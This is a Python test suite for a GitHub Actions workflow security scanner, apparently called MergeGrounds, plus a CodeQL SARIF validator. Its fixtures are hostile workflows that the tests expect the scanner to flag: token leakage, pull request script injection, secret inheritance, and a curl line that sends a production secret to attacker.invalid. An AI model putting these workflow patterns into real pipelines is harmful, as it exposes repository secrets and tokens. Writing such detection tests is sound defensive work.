from __future__ import annotations

import hashlib
import importlib.util
import json
import os
import re
import subprocess
import sys
import tempfile
import textwrap
import unittest
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
SPEC = importlib.util.spec_from_file_location("mergegrounds_workflow_hardening", ROOT / "scripts" / "mergegrounds.py")
assert SPEC and SPEC.loader
mergegrounds = importlib.util.module_from_spec(SPEC)
sys.modules[SPEC.name] = mergegrounds
SPEC.loader.exec_module(mergegrounds)


WORKFLOW_HEADER = """
name: Expression hardening probe
on:
  pull_request:
permissions:
  contents: read
concurrency:
  group: probe-${{ github.event.pull_request.number || github.ref }}
  cancel-in-progress: false
jobs:
  probe:
    runs-on: ubuntu-24.04
    steps:
"""


class WorkflowExpressionHardeningTests(unittest.TestCase):
    def setUp(self) -> None:
        self.temporary = tempfile.TemporaryDirectory()
        self.root = Path(self.temporary.name)
        self.workflow = self.root / ".github" / "workflows" / "probe.yml"
        self.workflow.parent.mkdir(parents=True)

    def tearDown(self) -> None:
        self.temporary.cleanup()

    def findings_for(self, steps: str) -> list[mergegrounds.Finding]:
        workflow = textwrap.dedent(WORKFLOW_HEADER).lstrip() + textwrap.indent(
            textwrap.dedent(steps).strip() + "\n",
            "      ",
        )
        self.workflow.write_text(workflow, encoding="utf-8")
        return mergegrounds.workflow_findings(self.root)

    def codes_for(self, steps: str) -> set[str]:
        return {finding.code for finding in self.findings_for(steps)}

    @staticmethod
    def workflow_step(text: str, name: str) -> str:
        marker = f"      - name: {name}\n"
        start = text.index(marker)
        end = text.find("\n      - name: ", start + len(marker))
        return text[start:] if end == -1 else text[start:end]

    @staticmethod
    def step_run_script(step: str) -> str:
        lines = step.splitlines()
        start = next(index for index, line in enumerate(lines) if line.strip() == "run: |")
        return textwrap.dedent("\n".join(lines[start + 1 :])) + "\n"

    @staticmethod
    def step_python_heredoc(step: str) -> str:
        lines = step.splitlines()
        start = next(index for index, line in enumerate(lines) if "<<'PY'" in line)
        end = next(index for index in range(start + 1, len(lines)) if lines[index].strip() == "PY")
        return textwrap.dedent("\n".join(lines[start + 1 : end])) + "\n"

    def pinned_codeql_sarif_document(self) -> dict[str, object]:
        descriptor = json.loads(
            (ROOT / "tests/fixtures/codeql-action-v4.37.9-sarif-driver.json").read_text(
                encoding="utf-8"
            )
        )
        workflow = (ROOT / ".github/workflows/codeql.yml").read_text(encoding="utf-8")
        self.assertIn(
            f"github/codeql-action/analyze@{descriptor['action_sha']}",
            workflow,
        )
        self.assertIn("          tools: linked\n", workflow)
        self.assertEqual(
            "synthetic-contract-derived-from-pinned-action-source-and-cli-bytecode",
            descriptor["contract_kind"],
        )
        self.assertIn(descriptor["action_sha"], descriptor["defaults_source"])
        self.assertIn(descriptor["action_sha"], descriptor["grouping_source"])
        self.assertIn(descriptor["action_sha"], descriptor["identity_source"])
        self.assertIn(descriptor["action_sha"], descriptor["diagnostics_source"])
        self.assertIn(descriptor["action_sha"], descriptor["overlay_source"])
        for field in (
            "defaults_source_sha256",
            "grouping_source_sha256",
            "invocation_source_sha256",
            "identity_source_sha256",
            "diagnostics_source_sha256",
            "overlay_source_sha256",
            "cli_jar_sha256",
            "bundle_linux_sha256",
            "bundle_linux_zstd_sha256",
            "bundle_macos_sha256",
            "bundle_macos_zstd_sha256",
            "bundle_windows_sha256",
            "bundle_windows_zstd_sha256",
        ):
            self.assertRegex(descriptor[field], r"\A[0-9a-f]{64}\Z")
        self.assertEqual(374360615, descriptor["bundle_release_id"])
        self.assertIs(True, descriptor["bundle_release_immutable"])
        self.assertEqual(
            "official-release-fallback-assets-not-runtime-byte-attestation",
            descriptor["bundle_digest_scope"],
        )
        return {
            "$schema": descriptor["schema"],
            "version": "2.1.0",
            "runs": [
                {
                    "tool": {
                        "driver": {
                            **descriptor["driver"],
                            "semanticVersion": descriptor[
                                "expected_cli_semantic_version"
                            ],
                            "rules": [],
                            "notifications": [
                                {
                                    "id": "codeql-action/overlay-disabled",
                                    "name": "codeql-action/overlay-disabled",
                                    "shortDescription": {
                                        "text": "Overlay analysis disabled"
                                    },
                                    "fullDescription": {
                                        "text": "Overlay analysis disabled"
                                    },
                                    "defaultConfiguration": {"enabled": True},
                                }
                            ],
                        },
                        "extensions": [
                            {
                                "name": "codeql/javascript-queries",
                                "rules": [descriptor["rule"]],
                            }
                        ],
                    },
                    "automationDetails": {"id": "/language:javascript-typescript/"},
                    "invocations": [
                        {
                            "executionSuccessful": True,
                            "toolExecutionNotifications": [
                                {
                                    "descriptor": {
                                        "id": "codeql-action/overlay-disabled",
                                        "index": 0,
                                    },
                                    "level": "none",
                                    "message": {"text": ""},
                                    "properties": {
                                        "attributes": {
                                            "reason": "non-default-queries"
                                        },
                                        "visibility": {
                                            "statusPage": False,
                                            "telemetry": True,
                                        },
                                    },
                                    "timeUtc": "2026-09-05T00:00:00Z",
                                }
                            ],
                            "toolConfigurationNotifications": [],
                        }
                    ],
                    "properties": {"semmle.formatSpecifier": "sarif-latest"},
                    "results": [],
                }
            ],
        }

    def test_implicit_token_and_whole_context_variants_are_rejected(self) -> None:
        cases = {
            "direct token in run": """
                - run: echo "${{ github.token }}"
            """,
            "single-quoted bracket token in env": """
                - run: echo safe
                  env:
                    EXFIL: ${{ github['token'] }}
            """,
            "double-quoted bracket token in with": """
                - uses: example/safe-action@0123456789abcdef0123456789abcdef01234567
                  with:
                    credential: ${{ github["token"] }}
            """,
            "case-insensitive token": """
                - run: echo "${{ GitHub['TOKEN'] }}"
            """,
            "dynamic root index": """
                - run: echo "${{ github[inputs.property] }}"
            """,
            "computed root index": """
                - run: echo "${{ github['to' + 'ken'] }}"
            """,
            "whole context": """
                - run: echo "${{ github }}"
            """,
            "serialized whole context": """
                - run: |
                    printf '%s\\n' "${{ toJSON(github) }}"
            """,
            "wrapped whole context": """
                - run: echo "${{ fromJSON(toJSON((github))).token }}"
            """,
        }
        for label, steps in cases.items():
            with self.subTest(label=label):
                self.assertIn("PR_TOKEN", self.codes_for(steps))

    def test_all_non_allowlisted_pull_request_paths_are_rejected(self) -> None:
        cases = {
            "title in run": """
                - run: echo "${{ github.event.pull_request.title }}"
            """,
            "body through bracket path in env": """
                - run: echo safe
                  env:
                    BODY: ${{ github['event']['pull_request']['body'] }}
            """,
            "head ref in with": """
                - uses: example/safe-action@0123456789abcdef0123456789abcdef01234567
                  with:
                    ref: ${{ github.event.pull_request.head.ref }}
            """,
            "head repository": """
                - run: echo "${{ github.event.pull_request.head.repo.full_name }}"
            """,
            "user login": """
                - run: echo "${{ github.event.pull_request.user.login }}"
            """,
            "unknown future field fails closed": """
                - run: echo "${{ github.event.pull_request.assignee.login }}"
            """,
            "indexed reviewer": """
                - run: echo "${{ github.event.pull_request.requested_reviewers[0].login }}"
            """,
            "dynamic pull request property": """
                - run: echo "${{ github.event.pull_request[inputs.property] }}"
            """,
            "dynamic event property": """
                - run: echo "${{ github.event[inputs.property] }}"
            """,
            "whole event": """
                - run: echo "${{ github.event }}"
            """,
            "serialized pull request": """
                - run: echo "${{ toJSON(github.event.pull_request) }}"
            """,
            "head ref shorthand": """
                - run: echo "${{ github['head_ref'] }}"
            """,
        }
        for label, steps in cases.items():
            with self.subTest(label=label):
                self.assertIn("SCRIPT_INJECTION", self.codes_for(steps))

    def test_safe_platform_scalars_remain_usable_in_every_sink(self) -> None:
        findings = self.findings_for(
            """
            - run: |
                printf '%s\n' "${{ github.sha }}" "${{ github.run_id }}"
              env:
                BASE_SHA: ${{ github.event.pull_request.base.sha }}
                HEAD_SHA: ${{ github['event']['pull_request']['head']['sha'] }}
                PR_ID: ${{ github.event.pull_request.id }}
                PR_NUMBER: ${{ github.event.pull_request.number }}
                REPOSITORY: ${{ github.repository }}
                EVENT_PATH: ${{ github.event_path }}
            - uses: example/safe-action@0123456789abcdef0123456789abcdef01234567
              with:
                ref: ${{ github.event.pull_request.head.sha }}
                repository: ${{ github['repository'] }}
            """
        )
        self.assertEqual([], findings)

    def test_candidate_local_composite_action_is_rejected_before_token_exposure(self) -> None:
        action = self.root / ".github" / "actions" / "exfil" / "action.yml"
        action.parent.mkdir(parents=True)
        action.write_text(
            textwrap.dedent(
                """
                name: Exfil
                runs:
                  using: composite
                  steps:
                    - shell: bash
                      run: printf '%s' "${{ github.token }}"
                """
            ).lstrip(),
            encoding="utf-8",
        )
        codes = self.codes_for(
            """
            - uses: ./.github/actions/exfil
            """
        )
        self.assertIn("CANDIDATE_LOCAL_ACTION", codes)

    def test_candidate_local_reusable_workflow_is_rejected_for_protected_events(self) -> None:
        for trigger in ("pull_request", "push", "merge_group"):
            with self.subTest(trigger=trigger):
                self.workflow.write_text(
                    textwrap.dedent(
                        f"""
                        name: Local reusable probe
                        on:
                          {trigger}:
                        permissions:
                          contents: read
                        jobs:
                          delegated:
                            uses: ./.github/workflows/candidate.yml
                        """
                    ).lstrip(),
                    encoding="utf-8",
                )
                codes = {finding.code for finding in mergegrounds.workflow_findings(self.root)}
                self.assertIn("CANDIDATE_LOCAL_ACTION", codes)

    def test_push_workflow_cannot_consume_secrets_or_select_dynamic_runner(self) -> None:
        self.workflow.write_text(
            textwrap.dedent(
                """
                name: Hostile branch push
                on: [push]
                permissions:
                  contents: read
                concurrency:
                  group: push-${{ github.sha }}
                  cancel-in-progress: false
                jobs:
                  exfiltrate:
                    runs-on: ${{ github.ref_name }}
                    steps:
                      - env:
                          STOLEN: ${{ secrets.PROD_SECRET }}
                        run: curl --data "$STOLEN" https://attacker.invalid
                """
            ).lstrip(),
            encoding="utf-8",
        )
        codes = {finding.code for finding in mergegrounds.workflow_findings(self.root)}
        self.assertIn("PR_SECRET", codes)
        self.assertIn("DYNAMIC_EXECUTION_CONTROL", codes)

    def test_manual_dispatch_cannot_grant_candidate_selected_write_authority(self) -> None:
        self.workflow.write_text(
            textwrap.dedent(
                """
                name: Manual branch authority probe
                on: [workflow_dispatch]
                permissions:
                  contents: read
                concurrency:
                  group: manual-${{ github.sha }}
                  cancel-in-progress: false
                jobs:
                  upload:
                    runs-on: ubuntu-24.04
                    permissions:
                      security-events: write
                    steps:
                      - run: echo unsafe write authority
                """
            ).lstrip(),
            encoding="utf-8",
        )
        self.assertIn(
            "WRITE_PERMISSION",
            {finding.code for finding in mergegrounds.workflow_findings(self.root)},
        )

    def test_issue_comment_event_cannot_expose_secret_or_comment_body(self) -> None:
        self.workflow.write_text(
            textwrap.dedent(
                """
                name: Comment-triggered exfiltration probe
                on: [issue_comment]
                permissions:
                  contents: read
                jobs:
                  exfiltrate:
                    runs-on: ubuntu-24.04
                    steps:
                      - env:
                          STOLEN: ${{ secrets.PROD_SECRET }}
                        run: echo "${{ github.event.comment.body }} $STOLEN"
                """
            ).lstrip(),
            encoding="utf-8",
        )
        codes = {finding.code for finding in mergegrounds.workflow_findings(self.root)}
        self.assertIn("PR_SECRET", codes)
        self.assertIn("SCRIPT_INJECTION", codes)

    def test_dynamic_runner_expressions_fail_closed_without_label_spelling(self) -> None:
        for expression in (
            "${{ format('{0}-{1}', 'self', 'hosted') }}",
            "${{ vars.RUNNER }}",
            "${{ matrix.runner }}",
        ):
            with self.subTest(expression=expression):
                self.workflow.write_text(
                    textwrap.dedent(
                        f"""
                        name: Dynamic runner probe
                        on: [pull_request]
                        permissions:
                          contents: read
                        concurrency:
                          group: probe-${{{{ github.event.pull_request.number || github.ref }}}}
                          cancel-in-progress: false
                        jobs:
                          probe:
                            runs-on: {expression}
                            steps:
                              - run: echo unsafe runner selector
                        """
                    ).lstrip(),
                    encoding="utf-8",
                )
                self.assertIn(
                    "DYNAMIC_EXECUTION_CONTROL",
                    {finding.code for finding in mergegrounds.workflow_findings(self.root)},
                )

    def test_pr_data_in_runner_container_service_and_shell_controls_is_rejected(self) -> None:
        probes = {
            "runs-on": """
                runs-on: ${{ github.event.pull_request.title }}
                steps:
                  - run: echo safe
            """,
            "container image": """
                runs-on: ubuntu-24.04
                container:
                  image: ${{ github.event.pull_request.title }}
                steps:
                  - run: echo safe
            """,
            "service image": """
                runs-on: ubuntu-24.04
                services:
                  database:
                    image: ${{ github.event.pull_request.title }}
                steps:
                  - run: echo safe
            """,
            "matrix": """
                strategy:
                  matrix:
                    runner: ${{ github.event.pull_request.title }}
                runs-on: ubuntu-24.04
                steps:
                  - run: echo safe
            """,
            "shell": """
                runs-on: ubuntu-24.04
                steps:
                  - run: echo safe
                    shell: ${{ github.event.pull_request.title }}
            """,
            "working directory": """
                runs-on: ubuntu-24.04
                steps:
                  - run: echo safe
                    working-directory: ${{ github.event.pull_request.title }}
            """,
            "job condition": """
                if: ${{ github.event.pull_request.title }}
                runs-on: ubuntu-24.04
                steps:
                  - run: echo safe
            """,
            "step condition": """
                runs-on: ubuntu-24.04
                steps:
                  - if: ${{ github.event.pull_request.body }}
                    run: echo safe
            """,
        }
        prefix = textwrap.dedent(
            """
            name: Execution selector probe
            on:
              pull_request:
            permissions:
              contents: read
            jobs:
              probe:
            """
        ).lstrip()
        for label, job in probes.items():
            with self.subTest(label=label):
                self.workflow.write_text(
                    prefix + textwrap.indent(textwrap.dedent(job).strip() + "\n", "    "),
                    encoding="utf-8",
                )
                codes = {finding.code for finding in mergegrounds.workflow_findings(self.root)}
                self.assertIn("SCRIPT_INJECTION", codes)

    def test_job_and_service_container_images_require_sha256_digests(self) -> None:
        probes = {
            "mutable job container": """
                container:
                  image: attacker/runner:latest
            """,
            "mutable service container": """
                services:
                  database:
                    image: attacker/database:latest
            """,
            "scalar job container": """
                container: attacker/runner:latest
            """,
        }
        for label, control in probes.items():
            with self.subTest(label=label):
                workflow = textwrap.dedent(
                    """
                    name: Container pinning probe
                    on:
                      pull_request:
                    permissions:
                      contents: read
                    jobs:
                      probe:
                        runs-on: ubuntu-24.04
                    """
                ).lstrip()
                workflow += textwrap.indent(textwrap.dedent(control).strip() + "\n", "    ")
                workflow += "    steps:\n      - run: echo safe\n"
                self.workflow.write_text(workflow, encoding="utf-8")
                self.assertIn(
                    "MUTABLE_CONTAINER_IMAGE",
                    {finding.code for finding in mergegrounds.workflow_findings(self.root)},
                )

        self.workflow.write_text(
            textwrap.dedent(
                """
                name: Immutable container probe
                on:
                  pull_request:
                permissions:
                  contents: read
                jobs:
                  probe:
                    runs-on: ubuntu-24.04
                    container:
                      image: example/runner@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef
                    services:
                      database:
                        image: example/database@sha256:abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789
                    steps:
                      - run: echo safe
                """
            ).lstrip(),
            encoding="utf-8",
        )
        self.assertNotIn(
            "MUTABLE_CONTAINER_IMAGE",
            {finding.code for finding in mergegrounds.workflow_findings(self.root)},
        )

    def test_job_output_taint_cannot_be_laundered_into_execution(self) -> None:
        self.workflow.write_text(
            textwrap.dedent(
                """
                name: Output laundering probe
                on:
                  pull_request:
                permissions:
                  contents: read
                jobs:
                  source:
                    runs-on: ubuntu-24.04
                    outputs:
                      data: ${{ github.event.pull_request.title }}
                    steps:
                      - id: capture
                        run: echo safe
                  sink:
                    needs: source
                    runs-on: ubuntu-24.04
                    steps:
                      - run: echo "${{ needs.source.outputs.data }}"
                """
            ).lstrip(),
            encoding="utf-8",
        )
        codes = {finding.code for finding in mergegrounds.workflow_findings(self.root)}
        self.assertIn("SCRIPT_INJECTION", codes)
        self.assertIn("WORKFLOW_OUTPUT_TAINT", codes)

    def test_indirect_step_output_taint_cannot_reach_execution(self) -> None:
        self.workflow.write_text(
            textwrap.dedent(
                """
                name: Indirect output laundering probe
                on: [pull_request]
                permissions:
                  contents: read
                concurrency:
                  group: probe-${{ github.event.pull_request.number || github.ref }}
                  cancel-in-progress: false
                jobs:
                  source:
                    runs-on: ubuntu-24.04
                    outputs:
                      data: ${{ steps.capture.outputs.data }}
                    steps:
                      - id: capture
                        run: |
                          python3 -c 'import json,os; print("data="+json.load(open(os.environ["GITHUB_EVENT_PATH"]))["pull_request"]["title"])' >> "$GITHUB_OUTPUT"
                  sink:
                    needs: source
                    runs-on: ubuntu-24.04
                    steps:
                      - run: echo "${{ needs.source.outputs.data }}"
                """
            ).lstrip(),
            encoding="utf-8",
        )
        self.assertIn(
            "WORKFLOW_OUTPUT_TAINT",
            {finding.code for finding in mergegrounds.workflow_findings(self.root)},
        )

    def test_pull_request_reusable_workflows_cannot_inherit_or_map_secrets(self) -> None:
        cases = {
            "inherit all secrets": "secrets: inherit",
            "explicit secret map": "secrets:\n  TOKEN: ${{ github.token }}",
        }
        for label, secret_block in cases.items():
            with self.subTest(label=label):
                workflow = textwrap.dedent(
                    """
                    name: Reusable workflow secret probe
                    on: [pull_request]
                    permissions:
                      contents: read
                    concurrency:
                      group: probe-${{ github.event.pull_request.number || github.ref }}
                      cancel-in-progress: false
                    jobs:
                      exfil:
                        uses: attacker/steal/.github/workflows/exfil.yml@0123456789abcdef0123456789abcdef01234567
                    """
                ).lstrip()
                workflow += textwrap.indent(secret_block + "\n", "    ")
                self.workflow.write_text(workflow, encoding="utf-8")
                self.assertIn(
                    "PR_SECRET",
                    {finding.code for finding in mergegrounds.workflow_findings(self.root)},
                )

    def test_context_names_inside_expression_strings_are_not_references(self) -> None:
        findings = self.findings_for(
            """
            - run: |
                printf '%s\n' "${{ 'github.token' }}"
                printf '%s\n' "${{ 'github.event.pull_request.title' }}"
              env:
                DOCUMENTATION: ${{ 'toJSON(github)' }}
            """
        )
        self.assertEqual([], findings)

    def test_yaml_escape_obfuscation_and_unclosed_expressions_fail_closed(self) -> None:
        escaped = self.codes_for(
            r'''
            - run: "echo ${{ gith\u0075b.token }}"
            '''
        )
        self.assertIn("WORKFLOW_SYNTAX", escaped)

        unclosed = self.codes_for(
            """
            - run: echo "${{ github.token"
            """
        )
        self.assertLessEqual({"WORKFLOW_SYNTAX", "PR_TOKEN"}, unclosed)

        encoded_delimiters = self.codes_for(
            r'''
            - run: "echo \u0024\u007b\u007b github.token \u007d\u007d"
            '''
        )
        self.assertIn("WORKFLOW_SYNTAX", encoded_delimiters)

    def test_unsupported_yaml_forms_fail_closed_without_parsing_them(self) -> None:
        flow_mapping = self.codes_for(
            """
            - uses: example/safe-action@0123456789abcdef0123456789abcdef01234567
              with: {payload: "${{ github.token }}"}
            """
        )
        self.assertLessEqual({"WORKFLOW_SYNTAX", "PR_TOKEN"}, flow_mapping)

        explicit_key = self.codes_for(
            """
            ? run
            : echo "${{ github.token }}"
            """
        )
        self.assertIn("WORKFLOW_SYNTAX", explicit_key)

    def test_flow_style_jobs_cannot_hide_execution_controls(self) -> None:
        probes = {
            "PR title": 'echo ${{ github.event.pull_request.title }}',
            "implicit token": 'echo ${{ github.token }}',
            "mutable container": "echo safe",
        }
        for label, command in probes.items():
            with self.subTest(label=label):
                container = ", container: attacker/runner:latest" if label == "mutable container" else ""
                self.workflow.write_text(
                    "name: Flow bypass probe\n"
                    "on: [pull_request]\n"
                    "permissions:\n"
                    "  contents: read\n"
                    "jobs: {probe: {runs-on: ubuntu-24.04"
                    f"{container}, steps: [{{run: \"{command}\"}}]}}}}\n",
                    encoding="utf-8",
                )
                self.assertIn(
                    "WORKFLOW_SYNTAX",
                    {finding.code for finding in mergegrounds.workflow_findings(self.root)},
                )

    def test_protected_workflow_concurrency_is_static_and_non_cancelling(self) -> None:
        cases = {
            "cancellation enabled": (
                "concurrency:\n  group: probe-${{ github.ref }}\n  cancel-in-progress: true",
                {"CONCURRENCY_INVALID"},
            ),
            "dynamic cancellation": (
                "concurrency:\n  group: probe-${{ github.ref }}\n"
                "  cancel-in-progress: ${{ github.event.pull_request.title }}",
                {"CONCURRENCY_INVALID", "SCRIPT_INJECTION"},
            ),
            "PR-controlled group": (
                "concurrency:\n  group: ${{ github.event.pull_request.title }}\n"
                "  cancel-in-progress: false",
                {"CONCURRENCY_INVALID", "SCRIPT_INJECTION"},
            ),
            "flow mapping": (
                "concurrency: {group: probe, cancel-in-progress: false}",
                {"CONCURRENCY_INVALID", "WORKFLOW_SYNTAX"},
            ),
        }
        for label, (concurrency, expected_codes) in cases.items():
            with self.subTest(label=label):
                self.workflow.write_text(
                    "name: Concurrency probe\n"
                    "on: [pull_request]\n"
                    "permissions:\n"
                    "  contents: read\n"
                    f"{concurrency}\n"
                    "jobs:\n"
                    "  probe:\n"
                    "    runs-on: ubuntu-24.04\n"
                    "    steps:\n"
                    "      - run: echo safe\n",
                    encoding="utf-8",
                )
                codes = {finding.code for finding in mergegrounds.workflow_findings(self.root)}
                self.assertLessEqual(expected_codes, codes)

        safe_codes = self.codes_for("- run: echo safe")
        self.assertNotIn("CONCURRENCY_INVALID", safe_codes)

    def test_job_level_concurrency_cannot_cancel_repository_wide_security_runs(self) -> None:
        self.workflow.write_text(
            textwrap.dedent(
                """
                name: Nested concurrency collision probe
                on: [pull_request]
                permissions:
                  contents: read
                concurrency:
                  group: probe-${{ github.event.pull_request.number || github.ref }}
                  cancel-in-progress: false
                jobs:
                  probe:
                    concurrency:
                      group: mergegrounds-full-refs-heads-main
                      cancel-in-progress: true
                    runs-on: ubuntu-24.04
                    steps:
                      - run: echo safe
                """
            ).lstrip(),
            encoding="utf-8",
        )
        self.assertIn(
            "CONCURRENCY_INVALID",
            {finding.code for finding in mergegrounds.workflow_findings(self.root)},
        )

    def test_protected_workflows_never_receive_security_events_write(self) -> None:
        top_level = textwrap.dedent(
            """
            name: Permission escalation probe
            on: [pull_request]
            permissions:
              security-events: write
            concurrency:
              group: probe-${{ github.event.pull_request.number || github.ref }}
              cancel-in-progress: false
            jobs:
              probe:
                runs-on: ubuntu-24.04
                steps:
                  - run: echo safe
            """
        ).lstrip()
        self.workflow.write_text(top_level, encoding="utf-8")
        self.assertIn(
            "PR_WRITE_PERMISSION",
            {finding.code for finding in mergegrounds.workflow_findings(self.root)},
        )

        job_level = top_level.replace(
            "permissions:\n  security-events: write",
            "permissions:\n  contents: read",
        ).replace(
            "  probe:\n    runs-on:",
            "  probe:\n    permissions:\n      security-events: write\n    runs-on:",
        )
        self.workflow.write_text(job_level, encoding="utf-8")
        self.assertIn(
            "PR_WRITE_PERMISSION",
            {finding.code for finding in mergegrounds.workflow_findings(self.root)},
        )

        codeql = self.workflow.with_name("codeql.yml")
        self.workflow.unlink(missing_ok=True)
        codeql.write_text(
            job_level.replace("  probe:", "  analyze:", 1),
            encoding="utf-8",
        )
        self.assertIn(
            "PR_WRITE_PERMISSION",
            {finding.code for finding in mergegrounds.workflow_findings(self.root)},
        )

        codeql.write_bytes((ROOT / ".github/workflows/codeql.yml").read_bytes())
        codeql_text = codeql.read_text(encoding="utf-8")
        self.assertNotIn("security-events: write", codeql_text)
        self.assertIn("upload: never", codeql_text)
        self.assertIn("upload-database: false", codeql_text)
        self.assertIn('CODEQL_ACTION_FILE_COVERAGE_ON_PRS: "true"', codeql_text)
        self.assertIn("post-processed-sarif-path: codeql-postprocessed", codeql_text)
        self.assertNotIn(
            "PR_WRITE_PERMISSION",
            {finding.code for finding in mergegrounds.workflow_findings(self.root)},
        )

    def test_shipped_workflow_fail_closed_topology_is_digest_bound(self) -> None:
        cases = {
            "mergegrounds.yml": "      - name: Enforce MergeGrounds PR verdict",
            "full-scan.yml": "      - name: Enforce full MergeGrounds verdict",
            "codeql.yml": "  gate:\n",
            "release.yml": "      - name: Attest exact release candidate files",
        }
        self.workflow.unlink(missing_ok=True)
        for workflow_name, truncation_marker in cases.items():
            with self.subTest(workflow=workflow_name):
                path = self.workflow.with_name(workflow_name)
                original = (ROOT / ".github/workflows" / workflow_name).read_text(
                    encoding="utf-8"
                )
                self.assertIn(truncation_marker, original)
                path.write_text(
                    original[: original.index(truncation_marker)],
                    encoding="utf-8",
                )
                self.assertIn(
                    "WORKFLOW_TOPOLOGY",
                    {finding.code for finding in mergegrounds.workflow_findings(self.root)},
                )
                path.unlink()

    def test_only_exact_reviewed_release_workflow_receives_attestation_authority(self) -> None:
        self.workflow.unlink(missing_ok=True)
        release = self.workflow.with_name("release.yml")
        original = (ROOT / ".github/workflows/release.yml").read_text(encoding="utf-8")
        release.write_text(original, encoding="utf-8")
        codes = {finding.code for finding in mergegrounds.workflow_findings(self.root)}
        self.assertNotIn("WRITE_PERMISSION", codes)

        release.write_text(original.replace("attestations: write", "contents: write", 1), encoding="utf-8")
        changed_codes = {finding.code for finding in mergegrounds.workflow_findings(self.root)}
        self.assertIn("WORKFLOW_TOPOLOGY", changed_codes)
        self.assertIn("WRITE_PERMISSION", changed_codes)

        release.write_text(
            original.replace("artifact-metadata: write", "actions: write", 1),
            encoding="utf-8",
        )
        changed_codes = {finding.code for finding in mergegrounds.workflow_findings(self.root)}
        self.assertIn("WORKFLOW_TOPOLOGY", changed_codes)
        self.assertIn("WRITE_PERMISSION", changed_codes)

    def test_codeql_analyzer_cannot_continue_on_error(self) -> None:
        self.workflow.unlink(missing_ok=True)
        codeql = self.workflow.with_name("codeql.yml")
        text = (ROOT / ".github/workflows/codeql.yml").read_text(encoding="utf-8")
        marker = "      - name: Analyze\n"
        self.assertIn(marker, text)
        codeql.write_text(
            text.replace(marker, marker + "        continue-on-error: true\n", 1),
            encoding="utf-8",
        )
        codes = {finding.code for finding in mergegrounds.workflow_findings(self.root)}
        self.assertIn("WORKFLOW_TOPOLOGY", codes)
        self.assertIn("CONTINUE_ON_ERROR", codes)

    def test_codeql_sarif_validator_emits_subject_manifest_and_denies_findings(self) -> None:
        workflow = (ROOT / ".github/workflows/codeql.yml").read_text(encoding="utf-8")
        step = self.workflow_step(
            workflow,
            "Validate, inventory, and enforce zero findings",
        )
        validator = self.step_python_heredoc(step)
        base_document = self.pinned_codeql_sarif_document()
        environment = {
            **os.environ,
            "EXPECTED_LANGUAGE": "javascript-typescript",
            "EXPECTED_CATEGORY": "/language:javascript-typescript",
            "SUBJECT_SHA": "a" * 40,
            "REPOSITORY_ID": "acme/project",
            "WORKFLOW_REF": "acme/project/.github/workflows/codeql.yml@refs/pull/1/merge",
            "RUN_ID": "1234",
            "RUN_ATTEMPT": "2",
        }

        def execute(document: dict[str, object]) -> tuple[subprocess.CompletedProcess[str], Path, bytes]:
            temporary = tempfile.TemporaryDirectory()
            self.addCleanup(temporary.cleanup)
            root = Path(temporary.name)
            incoming = root / "incoming"
            incoming.mkdir()
            payload = json.dumps(document, separators=(",", ":")).encode("utf-8")
            (incoming / "upload.sarif").write_bytes(payload)
            result = subprocess.run(
                [sys.executable, "-I", "-"],
                input=validator,
                cwd=root,
                env=environment,
                text=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                check=False,
            )
            return result, root, payload

        allowed, root, payload = execute(base_document)
        self.assertEqual(0, allowed.returncode, allowed.stderr)
        manifest = json.loads(
            (root / "validated/javascript-typescript.manifest.json").read_text(
                encoding="utf-8"
            )
        )
        self.assertEqual("a" * 40, manifest["subject_sha"])
        self.assertEqual(0, manifest["sarif"]["results"])
        self.assertEqual(1, manifest["sarif"]["invocations"])
        self.assertEqual(1, manifest["sarif"]["rules"])
        self.assertEqual(
            ["codeql-action/overlay-disabled"],
            manifest["sarif"]["notification_ids"],
        )
        self.assertEqual(1, manifest["sarif"]["notification_levels"]["none"])
        self.assertEqual(
            "2.26.4",
            manifest["tool"]["semantic_version"],
        )
        self.assertEqual(
            "cdf488f595d80d6e07e03d4674febd5ab45fa938",
            manifest["tool"]["action_sha"],
        )
        self.assertEqual(
            "sha256:" + hashlib.sha256(payload).hexdigest(),
            manifest["sarif"]["sha256"],
        )
        self.assertEqual(
            payload,
            (root / "validated/javascript-typescript.sarif").read_bytes(),
        )

        with_finding = json.loads(json.dumps(base_document))
        with_finding["runs"][0]["results"] = [
            {"ruleId": "py/sql-injection", "level": "error"}
        ]
        denied, _, _ = execute(with_finding)
        self.assertNotEqual(0, denied.returncode)
        self.assertIn("zero-finding policy denies admission", denied.stderr)

        synthetic_alias = json.loads(json.dumps(base_document))
        synthetic_alias["runs"][0]["tool"]["driver"]["name"] = (
            "CodeQL command-line toolchain"
        )
        denied_alias, _, _ = execute(synthetic_alias)
        self.assertNotEqual(0, denied_alias.returncode)
        self.assertIn("pinned CodeQL CLI output", denied_alias.stderr)

        wrong_cli = json.loads(json.dumps(base_document))
        wrong_cli["runs"][0]["tool"]["driver"]["semanticVersion"] = "2.26.3"
        denied_cli, _, _ = execute(wrong_cli)
        self.assertNotEqual(0, denied_cli.returncode)
        self.assertIn("semanticVersion must be 2.26.4", denied_cli.stderr)

        failed_invocation = json.loads(json.dumps(base_document))
        failed_invocation["runs"][0]["invocations"] = [
            {
                "executionSuccessful": False,
                "toolExecutionNotifications": [
                    {"level": "error", "message": {"text": "analysis failed"}}
                ],
            }
        ]
        denied_invocation, _, _ = execute(failed_invocation)
        self.assertNotEqual(0, denied_invocation.returncode)
        self.assertIn("did not complete successfully", denied_invocation.stderr)

        adverse_diagnostic = json.loads(json.dumps(base_document))
        adverse_diagnostic["runs"][0]["invocations"][0][
            "toolExecutionNotifications"
        ] = [
            {
                "descriptor": {
                    "id": "go/workflow/incomplete-extraction",
                    "index": 1,
                },
                "level": "warning",
                "message": {"text": "analysis coverage may be incomplete"},
            }
        ]
        adverse_diagnostic["runs"][0]["tool"]["driver"]["notifications"].append(
            {
                "id": "go/workflow/incomplete-extraction",
                "name": "go/workflow/incomplete-extraction",
            }
        )
        denied_diagnostic, _, _ = execute(adverse_diagnostic)
        self.assertNotEqual(0, denied_diagnostic.returncode)
        self.assertIn("adverse configuration/execution", denied_diagnostic.stderr)

        malformed_overlay = json.loads(json.dumps(base_document))
        malformed_overlay["runs"][0]["invocations"][0][
            "toolExecutionNotifications"
        ][0]["properties"]["attributes"]["reason"] = "attacker-defined"
        denied_overlay, _, _ = execute(malformed_overlay)
        self.assertNotEqual(0, denied_overlay.returncode)
        self.assertIn("overlay telemetry", denied_overlay.stderr)

